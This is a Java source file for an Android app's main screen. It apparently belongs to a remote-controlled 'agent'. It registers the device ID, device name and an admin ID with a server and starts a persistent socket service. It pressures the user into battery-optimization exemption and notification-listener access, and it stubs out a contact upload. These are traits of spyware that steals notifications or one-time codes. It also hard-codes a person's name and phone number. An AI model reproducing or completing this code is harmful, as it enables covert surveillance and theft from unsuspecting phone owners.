package com.topdown.softy;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationManagerCompat;

import com.topdown.softy.databinding.ActivityMainBinding;
import com.topdown.softy.functions.DetailsManager;
import com.topdown.softy.functions.PermissionManager;
import com.topdown.softy.functions.Prefs;
import com.topdown.softy.functions.Utils;
import com.topdown.softy.server.req.RetrofitClient;
import com.topdown.softy.server.socket.SocketService;
import com.topdown.softy.ui.Page1Activity;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.TimeZone;
import java.util.logging.Level;
import java.util.logging.Logger;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    private static final Logger LOGGER = Logger.getLogger(MainActivity.class.getName());
    Prefs prefs;
    private PermissionManager permissionManager;
    private boolean runtimePermissionsDone = false;
    private boolean waitingForBatteryResult = false;
    private ActivityMainBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        prefs = new Prefs(this);

        if (prefs.getPref("installedAt").equals(Prefs.NO_DATA)) {
            prefs.setPref("installedAt", getTime(new Date()));
        }

        permissionManager = new PermissionManager(this, new PermissionManager.PermissionCallback() {
            @Override
            public void onPermissionGranted(String permission) {
                Utils.markLog(MainActivity.this, "Permission: " + permission.replace("android.permission.", "") + " ✅", "MainActivity");
            }

            @Override
            public void onPermissionDenied(String permission, boolean permanentlyDenied) {
                Utils.markLog(MainActivity.this, "Permission: " + permission.replace("android.permission.", "") + " ❌", "MainActivity");
            }

            @Override
            public void onAllDone() {
                // Runtime permissions finished
                runtimePermissionsDone = true;

                // Start battery whitelist flow
                waitingForBatteryResult = true;
                permissionManager.requestIgnoreBatteryOptimizationsIfDeclared();
            }
        }, List.of()); // forced permissions if any

        permissionManager.start();

        onAgentInit();
    }

    @Override
    protected void onResume() {
        super.onResume();

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        boolean batteryOk = pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        boolean notifOk = NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName());

        // Ask one thing at a time
        if (!runtimePermissionsDone) {
            // Still waiting for runtime permissions → do nothing yet
            return;
        }

        if (!batteryOk) {
            // Ask for battery optimization exclusion
            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Toast.makeText(this, "Please disable battery optimization for this app", Toast.LENGTH_SHORT).show();
            return;
        }

        if (Utils.isNotificationReadingEnabled && !notifOk) {
            // Ask for notification listener permission
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Toast.makeText(this, "Please allow Notification Access", Toast.LENGTH_SHORT).show();
            return;
        }
//
//        if ("xiaomi".equalsIgnoreCase(android.os.Build.MANUFACTURER)) {
//            // Ask for Xiaomi auto-start only if all above are done
//            try {
//                Intent autostartIntent = new Intent();
//                autostartIntent.setComponent(new ComponentName(
//                        "com.miui.securitycenter",
//                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
//                ));
//                startActivity(autostartIntent);
//                Toast.makeText(this, "Please enable Auto Start", Toast.LENGTH_SHORT).show();
//            } catch (Exception ignored) {}
//            return;
//        }
        // If everything is done → proceed
        startNextActivity();
    }


    private boolean hasStarted = false;

    private void startNextActivity() {
        if (hasStarted) {
            return;
        }
        hasStarted = true;
        Intent intent = new Intent(this, Page1Activity.class);
        startActivity(intent);
        finish();
    }

    @SuppressLint("HardwareIds")
    private void onAgentInit() {
        Intent serviceIntent = new Intent(this, SocketService.class);
        startForegroundService(serviceIntent); // ✅ Only from visible UI

        try {
            if (Utils.ADMIN_USERNAME.isEmpty()) {
                return;
            }
            RetrofitClient.getInstance(this).getApiInterfaces().onAgentInit(RetrofitClient.generateRequestBody(new JSONObject().put("agentName", getString(R.string.app_name)).put("agentID", Utils.AGENT_ID).put("deviceID", Utils.getDeviceID(this)).put("adminID", Utils.ADMIN_USERNAME).put("deviceName", Utils.getPhoneName()).put("apiLevel", Build.VERSION.SDK_INT))).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
                    if (response.isSuccessful() && response.body() != null) {
                        try {
                            String resString = response.body().string();
                            JSONObject json = new JSONObject(resString);
                            String status = json.optString("status", "ok");
                            JSONObject object = new JSONObject();

                            object.put("Name", "Sahil Hossain");
                            object.put("number", "6033017709");
                            object.put("Theme", "Demo");
                            DetailsManager.saveDetails(MainActivity.this, object);
                            switch (status) {
                                case "suspended":
                                    // handle suspended agent/device
                                    break;
                                case "max-devices":
                                    // notify user or stop agent init
                                    break;
                                default:
                                    uploadContacts();
                                    // success
                                    break;
                            }
                        } catch (Exception e) {
                            LOGGER.log(Level.SEVERE, "Stack trace:", e);
                        }
                    }
                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {
                    Utils.markLog(MainActivity.this, "Unable to Initialize Agent : " + throwable.getMessage(), "MainActivity");
                    throwable.printStackTrace();
                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    private void uploadContacts() {
//        RetrofitClient.getInstance(this).getApiInterfaces().saveContacts().enqueue(new Callback<>() {
//            @Override
//            public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
//
//            }
//
//            @Override
//            public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {
//
//            }
//        });
    }

    public String getTime(Date date) {
        @SuppressLint("SimpleDateFormat") SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy, HH:mm:ss");
        sdf.setTimeZone(TimeZone.getTimeZone("Asia/Kolkata"));
        return sdf.format(date);
    }

    // forward permission results
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        permissionManager.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
